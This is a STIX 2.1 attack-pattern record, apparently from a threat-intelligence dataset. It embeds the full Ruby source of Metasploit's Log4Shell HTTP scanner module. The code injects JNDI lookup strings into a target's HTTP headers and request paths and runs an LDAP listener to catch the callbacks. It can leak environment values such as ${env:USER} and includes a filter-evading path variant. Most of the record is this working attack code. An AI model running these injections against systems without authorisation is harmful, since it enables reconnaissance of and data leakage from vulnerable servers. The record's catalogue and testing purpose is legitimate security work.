{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05e15ef1-a58b-46fa-85f8-88dbc8417593",
    "created": "2024-08-14T16:28:46.355765Z",
    "modified": "2024-08-14T16:28:46.355769Z",
    "name": "Log4Shell HTTP Scanner",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/log4shell_scanner.rb",
            "external_id": "log4shell_scanner.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-44228"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-45046"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://logging.apache.org/log4j/2.x/security.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Log4Shell\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Log4Shell HTTP Scanner',\n      'Description' => %q{\n        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,\n        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.\n\n        This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will\n        trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying\n        instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include\n        HTTP headers and the HTTP request path.\n\n        Known impacted software includes Apache Struts 2, VMWare VCenter, Apache James, Apache Solr, Apache Druid,\n        Apache JSPWiki, Apache OFBiz.\n      },\n      'Author' => [\n        'Spencer McIntyre', # The fun stuff\n        'RageLtMan <rageltman[at]sempervictus>', # Some plumbing\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'CVE', '2021-45046' ],\n        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis' ],\n        [ 'URL', 'https://logging.apache.org/log4j/2.x/security.html' ]\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => []\n      }\n    )\n\n    register_options([\n      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),\n      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),\n      OptString.new('LEAK_PARAMS', [ false, 'Additional parameters to leak, separated by the ^ character (e.g., ${env:USER}^${env:PATH})']),\n      OptPath.new(\n        'HEADERS_FILE',\n        [\n          false,\n          'File containing headers to check',\n          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')\n        ]\n      ),\n      OptPath.new(\n        'URIS_FILE',\n        [\n          false,\n          'File containing additional URIs to check',\n          File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_uris.txt')\n        ]\n      ),\n      OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 30 ])\n    ])\n  end\n\n  def log4j_jndi_string(resource = '')\n    resource = resource.dup\n    resource << '/${java:os}/${sys:java.vendor}_${sys:java.version}'\n    # We should add obfuscation to the URL string to scan through lousy \"next-gen\" firewalls\n    unless datastore['LEAK_PARAMS'].blank?\n      resource << '/'\n      resource << datastore['LEAK_PARAMS']\n    end\n    super(resource)\n  end\n\n  #\n  # Handle incoming requests via service mixin\n  #\n  def build_ldap_search_response(msg_id, base_dn)\n    token, java_os, java_version, uri_parts = base_dn.split('/', 4)\n    target_info = @mutex.synchronize { @tokens.delete(token) }\n    if target_info\n      @mutex.synchronize { @successes << target_info }\n      details = normalize_uri(target_info[:target_uri]).to_s\n      details << \" (header: #{target_info[:headers].keys.first})\" unless target_info[:headers].nil?\n      details << \" (os: #{java_os})\" unless java_os.blank?\n      details << \" (java: #{java_version})\" unless java_version.blank?\n      unless uri_parts.blank?\n        uri_parts = uri_parts.split('^')\n        leaked = ''\n        datastore['LEAK_PARAMS'].split('^').each_with_index do |input, idx|\n          next if input == uri_parts[idx]\n\n          leaked << \"#{input}=#{uri_parts[idx]}  \"\n        end\n        unless leaked.blank?\n          details << \" (leaked: #{leaked.rstrip})\"\n          vprint_good(\"Leaked data: #{leaked.rstrip}\")\n        end\n      end\n      peerinfo = \"#{target_info[:rhost]}:#{target_info[:rport]}\"\n      print_good(\"#{peerinfo.ljust(21)} - Log4Shell found via #{details}\")\n      report_vuln(\n        host: target_info[:rhost],\n        port: target_info[:rport],\n        info: \"Module #{fullname} detected Log4Shell vulnerability via #{details}\",\n        name: name,\n        refs: references\n      )\n    end\n\n    attrs = [ ]\n    appseq = [\n      base_dn.to_ber,\n      attrs.to_ber_sequence\n    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)\n    [ msg_id.to_ber, appseq ].to_ber_sequence\n  end\n\n  def rand_text_alpha_lower_numeric(len, bad = '')\n    foo = []\n    foo += ('a'..'z').to_a\n    foo += ('0'..'9').to_a\n    Rex::Text.rand_base(len, bad, *foo)\n  end\n\n  def run\n    validate_configuration!\n    @mutex = Mutex.new\n    @mutex.extend(::Rex::Ref)\n\n    @tokens = {}\n    @tokens.extend(::Rex::Ref)\n\n    @successes = []\n    @successes.extend(::Rex::Ref)\n\n    begin\n      start_service\n    rescue Rex::BindFailed => e\n      fail_with(Failure::BadConfig, e.to_s)\n    end\n\n    super\n\n    print_status(\"Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections\")\n    sleep datastore['LDAP_TIMEOUT']\n\n    if @successes.empty?\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Vulnerable(details: @successes)\n  end\n\n  def run_host(ip)\n    # probe the target before continuing\n    return if send_request_cgi('uri' => normalize_uri(target_uri)).nil?\n\n    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?\n\n    return if datastore['URIS_FILE'].blank?\n\n    File.open(datastore['URIS_FILE'], 'rb').each_line(chomp: true) do |uri|\n      next if uri.blank? || uri.start_with?('#')\n\n      if uri.include?('${jndi:uri}')\n        token = rand_text_alpha_lower_numeric(8..32)\n        jndi = log4j_jndi_string(token)\n        uri.delete_prefix!('/')\n        test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))\n      else\n        run_host_uri(ip, normalize_uri(target_uri, uri))\n      end\n    end\n  end\n\n  def run_host_uri(_ip, uri)\n    # HTTP_HEADER isn't exposed via the datastore but allows other modules to leverage this one to test a specific value\n    unless datastore['HTTP_HEADER'].blank?\n      token = rand_text_alpha_lower_numeric(8..32)\n      test(token, uri: uri, headers: { datastore['HTTP_HEADER'] => log4j_jndi_string(token) })\n    end\n\n    unless datastore['HEADERS_FILE'].blank?\n      headers_file = File.open(datastore['HEADERS_FILE'], 'rb')\n      headers_file.each_line(chomp: true) do |header|\n        next if header.blank? || header.start_with?('#')\n\n        token = rand_text_alpha_lower_numeric(8..32)\n        test(token, uri: uri, headers: { header => log4j_jndi_string(token) })\n      end\n    end\n\n    token = rand_text_alpha_lower_numeric(8..32)\n    jndi = log4j_jndi_string(token)\n    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))\n\n    token = rand_text_alpha_lower_numeric(8..32)\n    jndi = log4j_jndi_string(token)\n    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))\n  end\n\n  def test(token, uri: nil, headers: nil)\n    target_info = {\n      rhost: rhost,\n      rport: rport,\n      target_uri: uri,\n      headers: headers\n    }\n    @mutex.synchronize { @tokens[token] = target_info }\n\n    send_request_raw(\n      'uri' => uri,\n      'method' => datastore['HTTP_METHOD'],\n      'headers' => headers\n    )\n  end\n\n  attr_accessor :mutex, :tokens, :successes\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-12-09"
}